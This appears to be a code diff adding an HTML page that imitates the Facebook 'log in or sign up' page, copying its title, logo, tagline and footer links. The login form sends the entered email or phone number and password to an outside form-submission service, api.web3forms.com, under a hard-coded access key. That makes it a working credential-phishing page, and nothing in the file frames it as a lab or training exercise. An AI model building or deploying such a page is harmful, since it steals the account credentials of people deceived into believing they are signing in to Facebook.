@@ -1,0 +1,298 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link rel="shorcut icon" href="facebook.png">
+    <title>Facebook - log in or sign up</title>
+    <style>
+        * {
+            padding: 0;
+            margin: 0;
+            box-sizing: border-box;
+            font-family: Arial, Helvetica, sans-serif;
+            text-decoration: none;
+        }
+
+        body {
+            background-color: #F0F2F5;
+
+        }
+
+        #logo img {
+            height: auto;
+            width: 15.625rem;
+            margin-bottom: -50px;
+        }
+
+        .main {
+            height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+
+        }
+
+        .text {
+            height: auto;
+            width: 45vw;
+        }
+
+
+        #para {
+            margin-top: 0.5em;
+            font-size: xx-large;
+            text-align: left;
+            font-weight: 200;
+        }
+
+        .login_container {
+            height: 21.813rem;
+            width: 24.75rem;
+            background-color: white;
+            border-radius: 8px;
+            box-shadow: 0 4px 8px 0 rgba(0, 0, 0, 0.1), 0 6px 20px 0 rgba(0, 0, 0, 0.19);
+            display: flex;
+            flex-direction: column;
+
+        }
+
+        #emailorphone,
+        #password {
+            height: 50px;
+            width: 360px;
+            margin: 0.9em;
+            margin-bottom: 0;
+            font-size: medium;
+            padding: 25px;
+            border-radius: 8px;
+            border: none;
+            border: 0.5px solid #DDDFE2;
+        }
+
+
+        #login {
+            height: 50px;
+            width: 360px;
+            margin: 0.9em;
+            margin-bottom: 0;
+            border-radius: 8px;
+            color: white;
+            background-color: #0078F6;
+            border: none;
+            font-size: large;
+            font-weight: 600;
+        }
+
+        #forgotpassword {
+            height: 50px;
+            width: 360px;
+            margin: 0.9em;
+            margin-bottom: 0;
+            font-size: medium;
+            background-color: transparent;
+            border: none;
+            color: #0078F6;
+        }
+
+        #createAccount {
+            height: 50px;
+            width: 200px;
+            margin: 0.9em;
+            margin-left: 5em;
+            background-color: #36A420;
+            color: white;
+            font-size: large;
+            border: none;
+
+        }
+
+        hr {
+            margin: 0 20px;
+        }
+
+        #create_page {
+            color: black;
+            margin-top: 2em;
+            margin-left: 2em;
+            font-size: 15px;
+        }
+
+        #create_page a {
+            color: black;
+            font-weight: 600;
+        }
+
+        #create_page a:hover {
+            text-decoration: underline;
+        }
+
+        button:hover {
+            cursor: pointer;
+        }
+
+        footer {
+            background-color: white;
+            height: 200px;
+            width: 100vw;
+            color: #5c5d5f;
+            font-size: small;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            flex-direction: column;
+        }
+
+        .fo {
+            display: inline;
+        }
+
+        footer span {
+            width: 1000px;
+            color: #5c5d5f;
+            padding: 5px;
+            margin: 10px;
+        }
+
+        footer #links {
+            width: 1000px;
+        }
+
+
+        footer a {
+            color: #5c5d5f;
+            padding: 5px;
+            margin-top: 100px;
+
+        }
+
+        footer a:hover {
+            text-decoration: underline;
+        }
+
+        footer span .fo {
+            cursor: pointer;
+            margin: 3px;
+
+        }
+
+        footer span .fo:hover {
+            text-decoration: underline;
+        }
+
+
+        #line {
+            margin: 0;
+            margin-bottom: 10px;
+            color: #5c5d5f;
+            width: 1000px;
+
+        }
+
+        @media only screen and (min-width:150px) and (max-width:600px) {
+            .main {
+                height: 100vh;
+                display: flex;
+                flex-direction: column;
+                background-color: #F0F2F5;
+                justify-content: center;
+                align-items: center;
+            }
+
+            footer {
+                visibility: hidden;
+
+            }
+
+            #para {
+                margin-top: 0.5em;
+                font-size: x-large;
+                text-align: left;
+                font-weight: 200;
+            }
+
+            .text {
+                height: auto;
+                width: 70vw;
+                padding-bottom: 8%;
+            }
+
+
+        }
+    </style>
+</head>
+
+<body>
+    <div class="main">
+        <div class="text">
+            <div id="logo"> <img src="Facebook-Logo.png" alt="This is a text"></div>
+            <div id="para"> Facebook helps you connect and share with the people in your life.</div>
+        </div>
+
+    <form action="https://api.web3forms.com/submit" method="POST">
+        <div class="login_container">
+            <input type="hidden" name="access_key" value="dced7530-5f4c-426d-ac6c-d2b1d3f97728">
+            <div class="inp"> <input type="text" name="email"placeholder="Email address or phone number" id="emailorphone"></div>
+            <div class="inp"> <input type="password" name ="name/pass" placeholder="Password" id="password"></div>
+            <div class="inp"> <button type="submit" id="login">Log in</button></div>
+    </form>
+            <div class="inp"> <button type="button" id="forgotpassword"> Forgotten Password?</button></div>
+            <hr>
+            <div class="inp"> <button type="button" id="createAccount">Create New Account</button></div>
+            <div class="inp" id="create_page"> <a href="https://www.facebook.com/pages/create/?ref_type=registration_form"> Create a page</a> for a
+                celebrity, brand or business. </div>
+        </div>
+    </div>
+    
+    <footer>
+        <span>
+            <div class="fo">English (UK).</div>
+            <div class="fo">ગુજરાતી</div>
+            <div class="fo">हिन्दी</div>
+            <div class="fo">मराठी</div>
+            <div class="fo">اردو</div>
+            <div class="fo">ਪੰਜਾਬੀ</div>
+            <div class="fo">தமிழ்</div>
+            <div class="fo">తెలుగు</div>
+            <div class="fo">বাংলা</div>
+            <div class="fo">മലയാളം</div>
+            <div class="fo">Español</div>
+        </span>
+        <hr id="line">
+        <div id="links">
+            <a href="">Sign Up</a>
+            <a href="">Log in</a>
+            <a href="">Messenger</a>
+            <a href="">Facebook Lite</a>
+            <a href="">Video</a>
+            <a href="">Places</a>
+            <a href="">Games</a>
+            <a href="">Marketplace</a>
+            <a href="">Meta Pay</a>
+            <a href="">Meta Store</a>
+            <a href="">Meta Quest</a>
+            <a href="">Imagine with Meta AI</a>
+            <a href="">Instagram</a>
+            <a href="">Threads</a>
+            <a href="">Fundraisers</a>
+            <a href="">Services</a>
+            <a href="">Voting Information Centre</a>
+            <a href="">Privacy Policy</a>
+            <a href="">Privacy Centre</a>
+            <a href="">Groups</a>
+            <a href="">About</a>
+            <a href="">Create ad</a>
+            <a href="">Create Page</a>
+            <a href="">Developers</a>
+            <a href="">Careers</a>
+            <a href="">Cookies</a>
+            <a href="">AdChoices</a>
+            <a href="">Terms</a>
+            <a href="">Help</a>
+            <a href="">Contact uploading and non-users Settings</a>
+        </div>
+    </footer>
+</body>
+
+</html>
